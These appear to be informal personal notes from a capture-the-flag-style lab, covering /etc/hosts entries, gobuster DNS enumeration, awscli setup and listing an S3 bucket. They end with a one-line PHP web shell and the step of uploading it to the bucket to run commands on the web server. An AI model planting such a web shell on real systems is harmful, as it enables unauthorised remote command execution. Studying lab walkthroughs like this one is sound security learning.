to add a domain name we should first match the ip address of the website to a hostname : 
that by adding the line ip_address  domain_name to the etc/hosts using sudo 

![[Screenshot 2025-06-10 at 15.54.50.png]]

	( or using gobuster dns with -d domain_name )
	
	S3 is a cloud-based object storage service. It allows us to store things in containers called buckets. AWS S3 buckets have various use-cases including Backup and Storage, Media Hosting, Software Delivery, Static Website etc. The files stored in the Amazon S3 bucket are called S3 objects.
## the command tldr aws : main commainds to use the awscli  
	We can interact with this S3 bucket with the aid of the awscli utility. It can be installed on Linux using the command : apt install awscli .

## first we need to configure the awscli using : 
aws configure 

then to list all the buckets under the url : aws s3 ls --endpoint=http://s3.domain-name s3://domain-name


## creating a shell using php : 

	  <?php system($_GET['cmd']);  ?> 

Inside a shell.php file then copy this file to the s3 bucket and then can access the machine behind the web server 
